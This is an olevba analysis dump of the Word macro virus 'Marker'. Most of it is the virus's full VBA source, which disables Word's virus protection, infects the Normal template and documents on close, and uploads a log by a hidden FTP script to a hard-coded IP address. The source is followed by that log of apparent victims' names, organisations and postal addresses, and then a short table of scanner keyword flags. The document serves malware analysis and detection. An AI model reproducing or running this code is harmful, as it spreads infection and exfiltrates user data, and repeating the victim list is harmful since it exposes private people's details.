olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-a1c31c3187f0f7fcd0b5d0af5baa7869b708003d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-a1c31c3187f0f7fcd0b5d0af5baa7869b708003d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:27:50 AM - Monday, 28 Dec 1998
' Marsha Spitz
' Marsha Spitz
' 6th Floor
' Blue Cross and Blue Shield Assn.
' 225 N. Michigan Ave.
' Chicago, IL  60601



' 04:30:23 PM - Tuesday, 29 Dec 1998
' Anna Keyser
'



' 03:22:39 PM - Wednesday, 30 Dec 1998
' Barbara Allen
'



' 03:31:57 PM - Thursday, 7 Jan 1999
' BCBSA
'



' 10:11:44 AM - Monday, 11 Jan 1999
' Harold S. Cooper, F. S. A.
'



' 04:56:46 PM - Wednesday, 20 Jan 1999
' Brian M. Septon
'



' 09:38:23 AM - Tuesday, 26 Jan 1999
' Atul Agarkar
'



' 12:55:40 PM - Wednesday, 27 Jan 1999
' J&G Holland
'



' 12:25:19 PM - Wednesday, 3 Feb 1999
' Maya Patel
'



' 10:04:21 AM - Tuesday, 9 Feb 1999
' NBSI
'



' 09:29:24 AM - Friday, 12 Feb 1999
' O.B.1. Canobi
' BOOGZI BARBERS ... Food Buster!!!



' 08:50:07 AM - Friday, 19 Feb 1999
' rajen
'



' 07:20:46 PM - Sunday, 21 Feb 1999
' Eureka
'



' 08:21:16 AM - Monday, 22 Feb 1999
' rkurnool
'



' 06:49:46 PM - Monday, 1 Feb 1999
' Preferred Customer
'



' 08:46:19 PM - Wednesday, 24 Mar 1999
' Michael R. Walsh
' Walsh
' 21 Royal St Unit 2.
' Plymouth, MA 02360



' 09:52:44 AM - Tuesday, 20 Apr 1999
' Mike Walsh
' Massachusetts Maritime Academy
' Attn: M. Walsh, LT.
' 101 Academy Drive
' Buzzards Bay, MA 20336



' 08:59:17 AM - Wednesday, 19 May 1999
' Sam White
' Samuel White
' M.M.A. Box 337
' 101 Academy Drive
' Buzzards Bay, MA 02532



' 10:50:43 AM - Wednesday, 1 Sep 1999
' Robert A. Mortensen II
'



' 05:34:39 AM - Tuesday, 18 Jan 2000
' Ken Kingkade
' R. Nash
' 109 Bacon Road
' Hyannis, MA 02601



' 04:09:29 PM - Thursday, 6 Apr 2000
' Matt Brooks
' Nicole Brooks
' 5 Cherrywood Circle
' Andover, MA 01810



' 07:26:45 PM - Wednesday, 12 Apr 2000
' Susan A. Corbett
'



' 07:53:30 PM - Sunday, 23 Apr 2000
' David R. Maiorano
' David Maiorano
' 101 Academy Dr.
' Buzzards Bay, MA. 02532



' 01:00:17 AM - Monday, 24 Apr 2000
' John F. Valentine
' 225 Sawmill Road
' Chepachet, R.I. 028



' 03:58:23 PM - Sunday, 24 Sep 2000
' Jeremiah
'



' 07:51:47 AM - Friday, 27 Oct 2000
' MIS DEPT
'



' 02:03:06 PM - Sunday, 29 Oct 2000
' Chris Salinder
'



' 08:51:02 AM - Friday, 13 Jun 2003
' Noble High School
'



' 02:57:34 PM - Wednesday, 4 Feb 2004
' Noble High School
'


' 11:20:59 AM - Saturday, 28 Feb 2004
' Trial User
'


' 07:55:29 PM - Wednesday, 8 Feb 2006
' Claudia Stephens User
' NHS
' 171 AER Lane
' Wells, ME 04090
' USA



' 11:42:21 AM - Monday, 10 Jul 2006
' MSAD #60
'



' 01:39:44 PM - Thursday, 12 Oct 2006
' Noble High School
'



' 09:52:58 AM - Wednesday, 15 Nov 2006
' Office 2004 Test Drive User
'



' 11:28:07 AM - Wednesday, 30 May 2007
' Intern Supervisor
'



' 11:36:26 AM - Thursday, 30 Aug 2007
' Intern Supervisor
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

